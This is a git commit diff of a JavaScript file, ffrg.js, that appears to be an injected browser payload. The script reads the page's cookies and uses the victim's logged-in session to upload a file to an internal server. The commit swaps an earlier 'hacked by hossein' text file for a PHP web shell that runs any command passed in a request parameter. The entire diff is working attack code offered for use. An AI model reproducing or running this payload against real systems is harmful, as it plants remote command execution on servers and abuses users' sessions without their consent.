810e0ffc8ba2a0d8fc941c1267be7bff6a56d9f6
hoseinvitaa <67623502+hoseinvitaa@users.noreply.github.com>
2025-05-09 12:08:21 +0200

    Update ffrg.js

--- ffrg.js
+++ ffrg.js
@@ -1,24 +1,22 @@
 alert("Payload loaded");
 (async () => {
-    const cookie = document.cookie;
-  
-    
-    const content = "hacked by hossein";
-    const file = new File([content], "pwned.txt", { type: "text/plain" });
-  
-    
-    const form = new FormData();
-    form.append("localfile", file);
-    form.append("MAX_FILE_SIZE", "1000000");
-    form.append("act", "upload");
-    form.append("dir", "");
-    form.append("submit", "Upload");
-  
-    
-    await fetch("https://10.23.108.10/app/ft/ft2.php", {
-      method: "POST",
-      credentials: "include", 
-      body: form
-    });
-  })();
-  
+  const cookie = document.cookie;
+
+  // Basic PHP shell payload
+  const content = `<?php if(isset($_REQUEST['cmd'])){echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>";} ?>`;
+
+  const file = new File([content], "shell.php", { type: "application/x-php" });
+
+  const form = new FormData();
+  form.append("localfile", file);
+  form.append("MAX_FILE_SIZE", "1000000");
+  form.append("act", "upload");
+  form.append("dir", "");
+  form.append("submit", "Upload");
+
+  await fetch("https://10.23.108.10/app/ft/ft2.php", {
+    method: "POST",
+    credentials: "include",
+    body: form
+  });
+})();
